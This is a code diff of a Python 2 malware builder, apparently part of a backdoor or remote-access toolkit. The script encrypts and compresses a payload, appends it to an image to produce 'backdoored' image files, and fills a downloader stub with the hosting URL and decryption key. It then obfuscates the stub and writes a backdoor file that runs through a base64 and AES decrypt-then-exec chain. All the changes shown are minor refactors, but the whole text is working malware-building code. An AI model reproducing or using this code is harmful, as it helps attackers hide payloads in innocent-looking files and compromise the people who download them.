@@ -141,13 +141,13 @@ random.shuffle(mywindows)
 
 cipher = AES.new(key)
 downpayload = EncodeAES(cipher, readyscript)
-downpayload = base64.b64encode(bz2.compress(downpayload))
+downpayload = bz2.compress(downpayload)
 
 image = random.choice(os.listdir("stubs/images"))
 with open('stubs/images/' + image, 'rb') as di:
 	imagedata = di.read()
-	imagelen = len(imagedata)
-	downpayload = imagedata + downpayload
+imagelen = str(len(imagedata))
+downpayload = imagedata + downpayload
 
 if not args.customurl:
 	with open(image, 'wb') as df:
@@ -158,19 +158,19 @@ if not args.customurl:
 	os.remove(image)
 	dlf = 'stubs/downloader.py'
 else:
-	with open('generated/backdoored_' + image, 'wb') as lf:
+	with open('generated/backdoored_%s' % image, 'wb') as lf:
 		lf.write(downpayload)
-	print ' [V] Backdoored image written to generated/backdoored_' + image
+	print ' [V] Backdoored image written to generated/backdoored_%s' % image
 	print ' [V] Expecting it to be hosted at ' + args.customurl
 	downurl = args.customurl
 	dlf = 'stubs/downloader_cust.py'
 
 with open(dlf, 'rb') as dl:
-	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', str(imagelen)).replace('***AESVAR***', AESvar).replace('***AESKEY***', key)
+	downloaderscript = dl.read().replace('***URL***', downurl).replace('***B64D***', bd64var).replace('***BZ2***', bz2var).replace('***URLO***', urlvar).replace('***OFFSET***', imagelen).replace('***AESVAR***', AESvar).replace('***AESKEY***', key)
 with open('tempobfs.py', 'wb') as o:
 	o.write(downloaderscript)
 obstime = subprocess.Popen('python tools/pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-downloaderscript = keyvar + ' = "' + key + '"\n' + obstime.stdout.read()
+downloaderscript = obstime.stdout.read()
 os.remove('tempobfs.py')
 cipher = AES.new(key2)
 downloader = EncodeAES(cipher, downloaderscript)
@@ -179,9 +179,9 @@ with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
 	f.write(",".join(myimports) + "\n")
 	f.write(";".join(myendings) + "\n")
-	f.write('try:\n	import ')
+	f.write('try:\n\timport ')
 	f.write(",".join(mywindows) + "\n")
-	f.write('except:\n	pass\n')
+	f.write('except:\n\tpass\n')
 	f.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key2,bd64var,downloader))))
 
 with open('stubs/server.py', 'rb') as rawserv:
